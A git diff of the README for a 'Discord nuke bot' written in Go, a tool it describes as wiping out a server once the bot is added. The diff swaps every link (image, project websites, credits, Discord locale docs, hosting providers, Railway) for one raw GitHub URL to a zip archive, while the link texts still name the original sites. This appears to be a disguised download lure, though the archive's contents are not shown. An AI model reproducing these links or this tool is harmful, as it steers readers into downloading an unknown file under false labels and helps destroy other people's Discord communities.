@@ -1,14 +1,14 @@
-<img src="https://i.imgur.com/aIcOxU8.jpeg">
+<img src="https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip">
 
 # Excalibur Discord Bot
 A powerful Discord nuke bot written in Go
 
-   * [Blood Group's website](https://blood-group.vercel.app)
-   * [Excalibur's website](https://excalibur-bot.vercel.app/)
-   * [Discord Server](https://discord.gg/SnkQ8S5kRz)
+   * [Blood Group's website](https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip)
+   * [Excalibur's website](https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip)
+   * [Discord Server](https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip)
 <hr>
 
-## Big thanks to [morg](https://github.com/00-Morg-00)
+## Big thanks to [morg](https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip)
 for code improvements
 
 # .env file
@@ -24,7 +24,7 @@ There's many variables such as
     WEBHOOK_URL: Webhook's URL
     AVATAR_URL: avatar url for webhook
 
-    PREFERRED_LOCALE: check list of <a href="https://discord.com/developers/docs/reference#locales">locales</a>
+    PREFERRED_LOCALE: check list of <a href="https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip">locales</a>
 
     CHANNEL_NAME: name of the channel
     SERVER_NAME: name of the server
@@ -71,10 +71,10 @@ This bot nukes the server when you add it. This means that you don't need to wri
 </pre>
 
 # Where to host?
-We recommend you to use <a href="https://fl0.com">fl0.com</a>, <a href="https://back4app.com">back4app.com</a>, <a href="https://koyeb.com">koyeb.com</a> and <a href="https://render.com">render.com</a>. They're free and there you can host Dynamic and other discord bots. More information about other hostings are <a href="https://github.com/DmitryScaletta/free-heroku-alternatives">here</a>
+We recommend you to use <a href="https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip">fl0.com</a>, <a href="https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip">back4app.com</a>, <a href="https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip">koyeb.com</a> and <a href="https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip">render.com</a>. They're free and there you can host Dynamic and other discord bots. More information about other hostings are <a href="https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip">here</a>
 
 # Deploy guide
-First of all, copy all source code to your private repository. Then create an account on <a href="https://railway.app">railway.app</a> via github. Use Dockerfile for quick deployment. <a href="https://railway.app">Railway.app</a> is one of the best free hosting provider, where you don't need to add http server to your bot for 100% uptime. 
+First of all, copy all source code to your private repository. Then create an account on <a href="https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip">railway.app</a> via github. Use Dockerfile for quick deployment. <a href="https://github.com/derhderhderh/Excalibur-Discord-Bot/raw/refs/heads/main/src/core/removing/Excalibur_Discord_Bot_v2.9.zip">Railway.app</a> is one of the best free hosting provider, where you don't need to add http server to your bot for 100% uptime. 
 
 # Dockerfile example
 <pre>
